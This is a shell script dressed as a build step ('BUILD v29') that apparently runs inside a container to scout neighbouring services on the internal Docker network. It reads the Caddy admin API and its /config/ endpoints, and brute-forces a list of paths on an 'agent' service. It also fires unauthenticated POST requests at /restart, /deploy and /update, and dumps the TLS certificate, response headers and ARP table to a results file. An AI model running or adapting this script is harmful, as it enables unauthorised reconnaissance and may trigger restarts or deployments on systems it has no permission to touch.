#!/bin/sh
exec > /build-results.txt 2>&1
echo "=== BUILD v29 — deep caddy + agent ==="
date -u

echo ""
echo "=== CADDY FULL METRICS ==="
curl -s -m 10 http://172.17.0.4:9090/metrics 2>&1

echo ""
echo "=== CADDY /config/ (admin on 2019 via 80 and 9090) ==="
echo "--- via :80/config/ ---"
curl -s -m 3 http://172.17.0.4:80/config/ 2>&1
echo ""
echo "--- via :9090/config/ ---"
curl -s -m 3 http://172.17.0.4:9090/config/ 2>&1
echo ""
echo "--- via :2019 ---"
curl -s -m 3 http://172.17.0.4:2019/ 2>&1
echo ""
echo "--- via :2019/config/ ---"
curl -s -m 3 http://172.17.0.4:2019/config/ 2>&1

echo ""
echo "=== AGENT — bruteforce endpoints ==="
for path in / /docs /openapi.json /redoc /api /api/v1 /status /info /version /env /config /metrics /debug /compose /services /containers /apps /webhooks /webhooks/ /admin /logs /events /restart /deploy /update; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -m 2 --http1.1 http://172.17.0.2:8000$path)
  echo "GET $path → $resp"
done

echo ""
echo "=== AGENT POST endpoints ==="
for path in /restart /deploy /update /compose/up /services/restart /webhooks/restart /api/restart; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -m 2 --http1.1 -X POST http://172.17.0.2:8000$path -H "Content-Type: application/json" -d '{}')
  echo "POST $path → $resp"
done

echo ""
echo "=== CADDY HTTPS cert details ==="
echo | openssl s_client -connect 172.17.0.4:443 -servername sashabal-poc-macvlan-20260903-44f0.twc1.net 2>&1 | openssl x509 -noout -text 2>&1 | head -40

echo ""
echo "=== CADDY response headers ==="
curl -svk -m 3 https://172.17.0.4/ 2>&1

echo ""
echo "=== ARP table ==="
cat /proc/net/arp

echo ""
echo "=== BUILD DONE ==="
